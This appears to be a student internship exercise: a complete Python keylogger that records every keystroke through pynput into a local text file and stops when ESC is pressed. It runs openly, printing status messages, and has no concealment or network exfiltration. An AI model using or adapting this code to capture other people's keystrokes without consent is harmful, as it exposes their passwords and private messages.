# -------------------------------
# Task-04: Simple Keylogger
# Internship Project - Prodigy Infotech
# -------------------------------

from pynput import keyboard

# File where keystrokes will be saved
log_file = "key_log.txt"

def on_press(key):
    try:
        # Try to log the character key
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (like enter, space, shift, etc.)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def on_release(key):
    # Stop the keylogger if ESC is pressed
    if key == keyboard.Key.esc:
        print("\n[+] Keylogger stopped (ESC pressed).")
        return False

print("[+] Keylogger is running... (Press ESC to stop)")

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
